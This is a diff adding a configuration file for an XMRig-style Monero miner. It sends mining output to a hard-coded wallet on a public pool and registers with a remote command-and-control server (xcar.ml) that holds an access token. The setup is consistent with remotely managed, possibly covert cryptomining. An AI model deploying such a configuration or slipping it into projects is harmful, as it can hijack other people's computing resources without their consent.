@@ -1,0 +1,42 @@
+{
+    "algo": "cryptonight",         
+    "av": null,                                                     
+    "aesni": 0,                    
+    "threads": 0,                  
+    "multihash-factor": 0,         
+    "multihash-thread-mask" : null,
+    "background": false,           
+    "colors": true,                
+    "cpu-affinity": null,          
+    "cpu-priority": null,          
+    "donate-level": 0,             
+    "log-file": null,              
+    "max-cpu-usage": 85,           
+    "print-time": 60,              
+    "retries": 5,                  
+    "retry-pause": 5,              
+    "safe": false,                 
+    "syslog": false,               
+    "pools": [
+        {
+            "url": "stratum+tcp://pool.supportxmr.com:5555",
+            "user": "41oQKeeytgeGT5PNzn1FSSKv1wXcT7LXP75wnNXMeRxshWVM8CJoe89JfJxR6B3cMx58bNQ4kVUqHPMhCDDoVyPnAm55W6M",
+            "pass": "x",      
+            "use-tls" : false,
+            "keepalive": true,
+            "nicehash": false 
+        }
+    ],
+    "api": {
+        "port": 0,                          
+        "access-token": null,               
+        "worker-id": null                   
+    },
+    "cc-client": {
+        "url": "xcar.ml:3344",                
+        "use-tls" : false,                    
+        "access-token": "oiKstBTOM47r",       
+        "worker-id": null,                    
+        "update-interval-s": 5               
+    }
+}
